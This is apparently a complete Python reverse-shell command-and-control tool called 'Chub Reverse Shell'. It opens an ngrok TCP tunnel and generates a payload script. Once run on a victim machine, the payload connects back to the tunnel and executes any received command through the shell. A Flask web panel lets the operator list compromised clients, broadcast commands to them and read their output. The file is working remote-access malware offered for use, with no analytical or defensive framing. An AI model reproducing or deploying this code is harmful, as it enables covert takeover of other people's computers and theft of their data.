import os
from pyngrok import ngrok
import sys
import argparse
from flask import Flask, request, jsonify, send_from_directory
import socket
import threading
from urllib.parse import urlparse

# Initialize the parser
parser = argparse.ArgumentParser(
    description="A basic command-line argument parser example."
)

# Add a positional argument
parser.add_argument("-p", "--port", type=int, help="PORT", required=True)

# Parse the arguments
args = parser.parse_args()

app = Flask(__name__, static_folder="public")

clients = (
    {}
)  # Dictionary to keep track of connected clients (key: client address, value: socket)
client_data = {}  # Dictionary to store received data per client
client_threads = {}  # Dictionary to keep track of client threads
lock = threading.Lock()  # Lock for thread-safe access to shared resources

def print_banner():
    banner = """
#################################################################
#  _____ _           _       _____                              #
# / ____| |         | |     |  __ \                             #
#| |    | |__  _   _| |__   | |__) |_____   _____ _ __ ___  ___ #
#| |    | '_ \| | | | '_ \  |  _  // _ \ \ / / _ \ '__/ __|/ _ \#
#| |____| | | | |_| | |_) | | | \ \  __/\ V /  __/ |  \__ \  __/#
# \_____|_| |_|\__,_|_.__/  |_|  \_\___| \_/ \___|_|  |___/\___|#
#  _____ _          _ _                                         #
# / ____| |        | | |                                        #
#| (___ | |__   ___| | |            by Muchub                   #
# \___ \| '_ \ / _ \ | |            https://github.com/muchub   #
# ____) | | | |  __/ | |                                        #
#|_____/|_| |_|\___|_|_|                                        #
#################################################################                                 
    """
    print(banner)
    
def generate_script(server_ip, server_port):
    script_content = f"""
import socket
import subprocess
import os

# Configuration
SERVER_IP = '{server_ip}'  # Replace with the server's IP address
SERVER_PORT = {server_port}

def execute_command(command):
    try:
        if command.strip()[:2] == 'cd':
            # Handle 'cd' command separately because it needs to change the working directory
            directory = command.strip()[3:].strip()
            if directory == '':
                directory = os.path.expanduser('~')  # Default to the home directory if no path is provided
            os.chdir(directory)
            return f"Changed directory to {{os.getcwd()}}"
        else:
            # Execute other commands
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {{e.output.decode('utf-8')}}"
    except FileNotFoundError as e:
        return f"Command not found: {{str(e)}}"
    except Exception as e:
        return f"Error: {{str(e)}}"

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))
    print(f"Connected to server {{SERVER_IP}}:{{SERVER_PORT}}")

    try:
        while True:
            command = client_socket.recv(1024).decode()
            if not command:
                break
            
            print(f"Received command: {{command}}")
            output = execute_command(command)
            
            # Send the command output back to the server
            client_socket.sendall(output.encode())
    except Exception as e:
        print(f"An error occurred: {{str(e)}}")
    finally:
        client_socket.close()
        print("Disconnected from server")

if __name__ == "__main__":
    main()
"""

    # Save the script to a file
    with open("payload/1337.py", "w") as file:
        file.write(script_content)
    text = """ 
[+]=========================================================[+]
|  Payload has saved at '/payload/1337.py'.                   |
[+]=========================================================[+]
|  Panel: http://localhost:5000                               |
[+]=========================================================[+]
    """    
    print(text)


def broadcast_command(command, client_address=None):
    with lock:
        if client_address:
            client_socket = clients.get(client_address)
            if client_socket:
                try:
                    # Send the command followed by a newline character
                    client_socket.sendall((command + "\n").encode())
                    # Log the command
                    client_data[client_address]["commands"].append(command)
                except BrokenPipeError:
                    print(f"BrokenPipeError: Client {client_address} has disconnected.")
                    clients.pop(client_address, None)
                    client_data.pop(client_address, None)
        else:
            for client_address, client_socket in list(clients.items()):
                try:
                    client_socket.sendall((command + "\n").encode())
                    # Log the command
                    client_data[client_address]["commands"].append(command)
                except BrokenPipeError:
                    print(f"BrokenPipeError: Client {client_address} has disconnected.")
                    clients.pop(client_address, None)
                    client_data.pop(client_address, None)


def start_tunnel(port):
    global tunnel
    tunnel = ngrok.connect(port, "tcp")
    parsed_url = urlparse(tunnel.public_url)
    ngrok_host, ngrok_port = parsed_url.netloc.split(":")
    generate_script(ngrok_host, ngrok_port)
    print(f"ngrok host: {ngrok_host}")
    print(f"ngrok port: {ngrok_port}")
    print(f"TCP Tunnel started at {tunnel.public_url}")


def stop_tunnel():
    global tunnel
    if tunnel:
        ngrok.disconnect(tunnel.public_url)
        print("Tunnel stopped.")
        tunnel = None
    else:
        print("No tunnel is running.")


def show_tunnel_url():
    if tunnel:
        print(f"Current Tunnel URL: {tunnel.public_url}")
    else:
        print("No tunnel is currently running.")


@app.route("/clients", methods=["GET"])
def get_clients():
    with lock:
        return jsonify({"clients": list(clients.keys())}), 200


@app.route("/command", methods=["POST"])
def send_command():
    try:
        data = request.json
        command = data.get("command", "")
        client_address = data.get("client_address", "")

        if not command:
            return jsonify({"error": "No command provided"}), 400

        if client_address:
            broadcast_command(command, client_address)
        else:
            broadcast_command(command)

        return (
            jsonify(
                {
                    "status": "Command sent",
                    "command": command,
                    "client_address": client_address,
                }
            ),
            200,
        )

    except Exception as e:
        print(f"Error in send_command: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/received_data/<client_address>', methods=['GET'])
def get_received_data(client_address):
    with lock:
        data = client_data.get(client_address, {"data": [], "commands": []})
    return jsonify({
        "received_data": data["data"],
        "sent_commands": data["commands"]
    }), 200


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")

def handle_client(client_socket, client_address):
    with lock:
        clients[client_address] = client_socket
        client_data[client_address] = {
            "data": [],
            "commands": [],
        }  # Initialize with both data and commands
    print(f"Client {client_address} connected.")

    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            data_decoded = data.decode()
            print(f"Received data from {client_address}: {data_decoded}")
            with lock:
                client_data[client_address]["data"].append(data_decoded)
    except Exception as e:
        print(f"Error with client {client_address}: {e}")
    finally:
        with lock:
            clients.pop(client_address, None)
            client_data.pop(client_address, None)
        client_socket.close()
        print(f"Client {client_address} disconnected.")


def start_server(server_port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", server_port))
    server_socket.listen()
    print(f"Server listening on port {server_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        client_address = f"{addr[0]}:{addr[1]}"
        client_thread = threading.Thread(
            target=handle_client, args=(client_socket, client_address), daemon=True
        )
        with lock:
            client_threads[client_address] = client_thread
        client_thread.start()


if __name__ == "__main__":
    print_banner()
    tunnel = None
    if args.port != None and isinstance(args.port, int):
        start_tunnel(args.port)
        print(f"Running TCP in port {args.port}")
        # Start the TCP server in a separate thread
        server_thread = threading.Thread(
            target=start_server, args=(args.port,), daemon=True
        )
        server_thread.start()

        # Start the Flask server
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    else:
        print("Invalid argument")
        sys.exit()
